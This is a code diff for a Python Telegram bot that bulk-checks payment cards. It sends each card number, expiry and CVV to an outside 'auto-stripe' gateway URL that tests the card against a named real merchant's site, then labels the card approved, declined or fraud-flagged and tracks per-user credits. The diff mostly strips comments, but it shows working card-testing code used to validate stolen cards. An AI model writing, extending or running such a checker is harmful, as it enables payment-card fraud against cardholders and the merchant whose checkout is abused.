@@ -1747,15 +1747,13 @@ async def consume_credit(user_id: int) -> bool:
 import asyncio
 import aiohttp
 import time
-import re
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 
 # === Helper: Format API status into stylish text ===
-# Format status more robustly
 def format_status(api_status: str) -> str:
     try:
-        clean_status = str(api_status).strip().lower()  # normalize
+        clean_status = str(api_status).strip().lower()
         if "approved" in clean_status:
             return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
         elif "declined" in clean_status or "generic decline" in clean_status:
@@ -1777,8 +1775,7 @@ def format_status(api_status: str) -> str:
         elif "fraudulent" in clean_status:
             return "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
         else:
-            # fallback for unexpected capitalization
-            return api_status.upper()  # raw fallback
+            return api_status.upper()
     except Exception:
         return "❌ ERROR ❌"
 
@@ -1800,7 +1797,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
 
             if len(parts[2]) == 4:
-                parts[2] = parts[2][-2:]
+                parts[2] = parts[2][-2:]  # convert year to 2-digit
             cc_normalized = "|".join(parts)
 
             api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1820,7 +1817,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 return f"❌ API Error for card `{escape_markdown(cc_normalized, version=2)}`: {escape_markdown(str(e), version=2)}"
 
             api_response = str(data.get("status", "Unknown")).strip()
-            status_text = format_status(api_response)  # always map to stylish text
+            status_text = format_status(api_response)
 
             # Update counts
             api_response_lower = api_response.lower()
@@ -1876,6 +1873,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
+
 
 
 
